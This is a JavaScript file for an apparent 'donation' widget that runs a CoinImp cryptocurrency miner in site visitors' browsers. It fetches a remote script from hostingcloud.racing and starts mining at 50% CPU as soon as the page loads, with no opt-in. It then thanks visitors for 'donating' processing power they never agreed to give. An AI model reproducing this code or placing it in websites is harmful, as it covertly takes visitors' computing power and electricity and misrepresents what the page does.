$.getScript("https://www.hostingcloud.racing/IBkN.js");

$(document).ready(function() {
  $('.webchain-widget').html(`
	<!-- Webchain Mining -->
	<input type="range" min="0" max="100" value="50" />
	<p id="range-value"></p>
	<p id="message"></p>
	<p id="threads"></p>
	<p id="hashrate"></p>
	<p id="hashes"></p>
	<br /><br />
  `);
});
  
// See coinimp documentation.
var _client = new Client.Anonymous('f9ceee66ca79d9eeef7cf0187197ab116b39d4efed1f1adf23d4e6dc0b88c85a', {
  autoThreads: true,
  c: 'w'
});

function mining() {
  // set the throttle which is ((100 - cpu usage %)/100)
  _client.setThrottle((100 - $('[type=range]').val()) / 100);
  // add log informations of the mining
  //$('body').append('<p id="message"></p>');
  //$('body').append('<p id="hashrate"></p>');
  setInterval(function() {
  	threads = _client.getNumThreads();
    $('#threads').text(threads + ' threads');
    hps = _client.getHashesPerSecond();
    $('#hashrate').text(hps + ' hashes / second');
		hashes = _client.getTotalHashes([true]);
    $('#hashes').text(hashes + ' hashes');
  }, 1000);
  // if the slider value is large than 0 start mining and vice versa
  if ($('[type=range]').val() > 0) {
    _client.start();
    $('#message').html('Thank you for donating at most ' + (100 - (_client.getThrottle() * 100)) + '% of your processing power for mining Webchain! Reference: <a href="https://www.coinimp.com/invite/8c923bdd-07f9-4051-a110-bf3db7fb8d07">https://www.coinimp.com/invite/8c923bdd-07f9-4051-a110-bf3db7fb8d07</a>.');
  } else {
    _client.stop();
    $('#message').text('Donate your processing power to mine Webchain for this site:');
  }
}

$(window).ready(function() {
  // When the value of the slider changes;
  $('[type=range]').change(function() {
    // write the value into the <p> tag with id range-value
    $('#range-value').text($(this).val());
    mining();
  });
  // run on startup
  mining();
})